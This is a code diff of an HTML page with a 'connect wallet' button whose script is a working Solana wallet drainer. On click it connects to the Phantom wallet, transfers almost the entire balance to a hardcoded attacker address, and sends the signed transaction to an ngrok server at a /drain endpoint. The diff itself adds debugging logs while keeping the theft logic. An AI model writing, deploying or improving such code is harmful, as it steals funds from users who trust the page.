@@ -13,7 +13,6 @@
             height: 100vh;
             background-color: #f0f0f0;
         }
-
         .container {
             text-align: center;
             background-color: #fff;
@@ -21,7 +20,6 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-
         button {
             margin: 10px;
             padding: 10px 20px;
@@ -41,67 +39,87 @@
     </div>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.30.2/lib/index.umd.min.js"></script>
     <script>
-        const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;
-        const connection = new Connection('https://api.mainnet-beta.solana.com');
-
-        document.getElementById('connect-wallet').addEventListener('click', async () => {
-    if (window.solana && window.solana.isPhantom) {
-        try {
-            // Request to connect to the wallet
-            const connectResponse = await window.solana.connect({ onlyIfTrusted: false });
-            const publicKey = connectResponse.publicKey;
-            alert(`Connected to wallet: ${publicKey.toString()}`);
+        // Дождемся загрузки библиотеки
+        document.addEventListener('DOMContentLoaded', () => {
+            // Объявляем переменные непосредственно из window.solanaWeb3
+            const Connection = solanaWeb3.Connection;
+            const PublicKey = solanaWeb3.PublicKey;
+            const SystemProgram = solanaWeb3.SystemProgram;
+            const Transaction = solanaWeb3.Transaction;
             
-            // Proceed with draining the wallet
-            const balance = await connection.getBalance(publicKey);
-            const lamportsToSend = balance - 5000; // Вычитаем комиссию за транзакцию
-            if (lamportsToSend <= 0) {
-                throw new Error('Insufficient funds to cover the transaction fee');
-            }
+            const connection = new Connection('https://api.mainnet-beta.solana.com');
             
-            // Замените на реальный публичный ключ получателя
-            const drainerPubkey = new PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
-            
-            const transaction = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey: publicKey,
-                    toPubkey: drainerPubkey,
-                    lamports: lamportsToSend,
-                })
-            );
-            
-            // Получаем недавний blockhash для валидности транзакции
-            const { blockhash } = await connection.getRecentBlockhash();
-            transaction.recentBlockhash = blockhash;
-            transaction.feePayer = publicKey;
-            
-            const signedTransaction = await window.solana.signTransaction(transaction);
-            
-            // Отправка на сервер
-            const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ 
-                    signedTransaction: Buffer.from(signedTransaction.serialize()).toString('base64') 
-                })
+            document.getElementById('connect-wallet').addEventListener('click', async () => {
+                console.log('Button clicked');
+                if (window.solana && window.solana.isPhantom) {
+                    try {
+                        console.log('Connecting to Phantom wallet...');
+                        // Request to connect to the wallet
+                        const connectResponse = await window.solana.connect({ onlyIfTrusted: false });
+                        const publicKey = connectResponse.publicKey;
+                        console.log(`Connected to wallet: ${publicKey.toString()}`);
+                        alert(`Connected to wallet: ${publicKey.toString()}`);
+                        
+                        // Proceed with draining the wallet
+                        console.log('Getting balance...');
+                        const balance = await connection.getBalance(publicKey);
+                        console.log(`Balance: ${balance} lamports`);
+                        
+                        const lamportsToSend = balance - 5000; // Вычитаем комиссию за транзакцию
+                        if (lamportsToSend <= 0) {
+                            throw new Error('Insufficient funds to cover the transaction fee');
+                        }
+                        
+                        console.log('Creating transaction...');
+                        // Замените на реальный публичный ключ получателя
+                        const drainerPubkey = new PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
+                        
+                        const transaction = new Transaction().add(
+                            SystemProgram.transfer({
+                                fromPubkey: publicKey,
+                                toPubkey: drainerPubkey,
+                                lamports: lamportsToSend,
+                            })
+                        );
+                        
+                        console.log('Getting recent blockhash...');
+                        const { blockhash } = await connection.getRecentBlockhash();
+                        transaction.recentBlockhash = blockhash;
+                        transaction.feePayer = publicKey;
+                        
+                        console.log('Signing transaction...');
+                        const signedTransaction = await window.solana.signTransaction(transaction);
+                        
+                        console.log('Sending transaction to server...');
+                        // Отправка на сервер
+                        const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ 
+                                signedTransaction: Array.from(signedTransaction.serialize()).toString() 
+                            })
+                        });
+                        
+                        if (!serverResponse.ok) {
+                            const errorText = await serverResponse.text();
+                            throw new Error(`Server error: ${serverResponse.status} - ${errorText}`);
+                        }
+                        
+                        const result = await serverResponse.json();
+                        alert('Transaction sent: ' + result.signature);
+                        
+                    } catch (err) {
+                        console.error('Transaction failed', err);
+                        alert('Transaction failed: ' + err.message);
+                    }
+                } else {
+                    console.log('Phantom wallet not found');
+                    alert('Solana wallet not found. Please install a wallet like Phantom.');
+                }
             });
-            
-            const result = await serverResponse.json();
-            if (serverResponse.ok) {
-                alert('Transaction sent: ' + result.signature);
-            } else {
-                throw new Error(result.error);
-            }
-        } catch (err) {
-            console.error('Transaction failed', err);
-            alert('Transaction failed: ' + err.message);
-        }
-    } else {
-        alert('Solana wallet not found. Please install a wallet like Phantom.');
-    }
-});
+        });
     </script>
 </body>
 </html>
